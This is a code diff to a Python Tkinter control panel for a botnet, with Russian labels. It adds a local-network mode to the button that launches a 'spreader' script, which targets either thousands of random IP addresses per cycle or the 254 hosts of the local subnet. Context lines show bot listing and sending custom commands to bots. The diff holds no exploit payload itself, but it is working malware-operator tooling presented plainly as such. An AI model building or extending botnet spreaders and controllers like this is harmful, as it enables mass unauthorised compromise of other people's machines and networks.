@@ -55,7 +55,13 @@ class BotnetTab(ttk.Frame):
         f.pack(pady=5)
         ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
         self.scale_var = tk.IntVar(value=10000)
-        ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8).pack(side=tk.LEFT, padx=5)
+        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
+        self.spin_count.pack(side=tk.LEFT, padx=5)
+
+        self.local_var = tk.BooleanVar()
+        self.check_local = ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed)
+        self.check_local.pack(side=tk.LEFT, padx=10)
+
         self.btn_start_spread = ttk.Button(f, text="Запустить спредер", command=self.toggle_spreader)
         self.btn_start_spread.pack(side=tk.LEFT, padx=10)
         self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
@@ -69,6 +75,12 @@ class BotnetTab(ttk.Frame):
         ttk.Button(cmd_frame, text="Отправить", command=self.send_custom_command).pack(side=tk.LEFT, padx=2)
         self.output_text = scrolledtext.ScrolledText(cmd_frame, height=4, bg="white")
         self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+
+    def _on_local_changed(self):
+        if self.local_var.get():
+            self.spin_count.configure(state='disabled')
+        else:
+            self.spin_count.configure(state='normal')
 
     def _auto_refresh(self):
         self.refresh_bots()
@@ -167,17 +179,23 @@ class BotnetTab(ttk.Frame):
             self.spread_log.insert(tk.END, "[*] Спредер остановлен\n")
             self.spreader_process = None
         else:
-            count = self.scale_var.get()
-            self.spread_log.insert(tk.END, f"[*] Запуск спредера, целей: {count}\n")
-            threading.Thread(target=self._run_spreader, args=(count,), daemon=True).start()
+            count = self.scale_var.get() if not self.local_var.get() else 254
+            mode = "локальная сеть" if self.local_var.get() else f"{count} случайных IP"
+            self.spread_log.insert(tk.END, f"[*] Запуск спредера, {mode}\n")
+            threading.Thread(target=self._run_spreader, args=(count, self.local_var.get()), daemon=True).start()
 
-    def _run_spreader(self, count):
+    def _run_spreader(self, count, local_mode=False):
         try:
             script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', '..', 'botnet', 'spreader.py')
             env = os.environ.copy()
             env['PYTHONIOENCODING'] = 'utf-8'
+            cmd = ["python", script_path]
+            if local_mode:
+                cmd.append("--local")
+            else:
+                cmd += ["--count", str(count)]
             self.spreader_process = subprocess.Popen(
-                ["python", script_path, "--count", str(count)],
+                cmd,
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, env=env
             )
             self.btn_start_spread.config(text="Остановить спредер")
